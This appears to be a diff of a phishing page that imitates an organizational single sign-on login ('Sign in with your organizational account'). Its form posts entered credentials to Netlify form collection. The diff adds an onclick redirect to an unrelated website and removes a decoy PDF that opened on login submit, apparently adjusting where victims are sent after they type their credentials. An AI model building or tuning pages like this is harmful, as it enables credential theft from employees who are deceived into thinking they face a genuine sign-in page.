@@ -185,7 +185,7 @@ InputUtil.updatePlaceholder = function (input, placeholderText) {
     <div id="loginArea">        
         <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
 
-        <form name="contact" method="POST" id="loginForm" data-netlify="true" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" netlify >
+        <form name="contact" method="POST" id="loginForm" data-netlify="true" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();"  onclick="window.location.href = 'https://www.w3docs.com';" netlify >
 		<div id="error" class="fieldMargin error smallText">
                 <span id="errorText" for=""></span>
             </div>
@@ -253,7 +253,7 @@ InputUtil.updatePlaceholder = function (input, placeholderText) {
             }();
 
             Login.submitLoginRequest = function () { 
-	        window.open("https://www.cambridgeinternational.org/Images/414139-2020-2022-syllabus.pdf");
+	        
                 var u = new InputUtil();
                 var e = new LoginErrors();
 
